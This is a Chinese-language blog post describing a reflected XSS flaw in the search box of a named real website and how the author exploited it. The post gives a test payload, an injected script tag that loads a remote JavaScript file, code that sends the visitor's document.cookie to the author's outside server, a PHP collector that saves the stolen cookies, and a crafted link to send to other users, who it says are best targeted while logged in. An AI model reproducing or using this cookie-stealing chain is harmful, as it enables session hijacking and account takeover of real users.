---
layout: post
title: 一个危险的XSS案例——轻松拿到登录用户的cookie
date: 2018-06-04
categories: blog
tags: [XSS漏洞实例,渗透]
description: 。
---

# 找到XSS漏洞
本着学习交流的目的，用颤巍巍的手指在站酷的作品搜索拦里输下了如下代码
```javascript
<script>alert(1)</script>

```
后按下了回车（http://www.zcool.com，chrome浏览器下访问）

![photo](http://images.cnitblog.com/blog/154088/201306/06125053-5a4d503ee97c423188df05a6b5e82f27.jpg)

内心一阵失落，并没有预期中那样弹出个框来，叹了口气。但是，毕竟是个不轻言放弃的人，于是想了：chrome浏览器的安全机制是比较强大的，莫非是浏览器做了什么事情？

于是F12打开控制台，果然~~好吧，输给chrome了。

![photo](http://images.cnitblog.com/blog/154088/201306/06125106-e06f115eb4dc4472b48b4f14c283e09f.jpg)

既然如此，其他浏览器呢？一向挺喜欢freifox浏览器的，前端工作人员嘛，于是firefox毫不犹豫成了第二个试验的对象。然后~~然后~~congratulations！！


![photo](http://images.cnitblog.com/blog/154088/201306/06125115-2fad8a95df8f45ff898732485aab8b04.jpg)

# 进一步利用XSS漏洞

虽然内容有一些鸡冻，但仅仅找到一个XSS漏洞显然无法满足一个充满求知欲望的前端攻城狮，于是继续想：是不是可以利用它来做更多事情呢？
 
首先分析了下站酷的页面表现神马的，发现它是将用户输入脚本直接输出到页面，那就好办了，果断输入如下内容：

```javascript
<script src="http://saintcoder.duapp.com/joke/joke.js"></script>

```
于是站酷华丽丽地就加载了一段joke.js（只是恶作剧性质的脚本），joke.js里面的代码也很简单，创建一个img标签，将它的src属性指向我预先写好的一个脚本joke.php，这里关键的一点是：将页面的cookie最为参数附加到url后面

```javascript  
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://saintcoder.duapp.com/joke/joke.php?joke='+encodeURIComponent(document.cookie);
```

然后呢，joke.php里也是相当简单，解析请求里面的joke参数（即用户的cookie），然后。。。然后偷偷保留起来别有他用~~

```javascript
复制代码
<?php
    @ini_set('display_errors',1);
    $str = $_GET['joke'];
    $filePath = "joke.php";

    if(is_writable($filePath)==false){
         echo "can't write";
    }else{
          $handler = fopen(filePath, "a");
          fwrite($handler, $str);
          fclose($handler);
    }
?>
```

将下面的地址发送给其他用户
```javascript
http://www.zcool.com.cn/tosearch.do?page=0&world=%3Cscript%20src=%22http://saintcoder.duapp.com/joke/joke.js%22%3E%3C/script%3E

```

如果当时用户登录效果更佳

